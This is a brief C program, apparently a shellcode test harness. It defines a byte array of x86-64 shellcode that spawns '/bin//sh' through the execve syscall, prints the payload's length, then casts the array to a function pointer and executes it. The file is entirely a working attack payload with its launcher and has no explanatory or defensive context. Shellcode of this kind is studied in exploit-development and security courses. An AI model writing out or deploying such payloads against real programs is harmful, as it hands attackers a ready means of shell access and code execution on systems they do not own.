#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x13\x48\x31\xc0\x48\x8b\x3c\x24\x50\x57\x48\x89\xe6\x48\xf7\xe2\x04\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
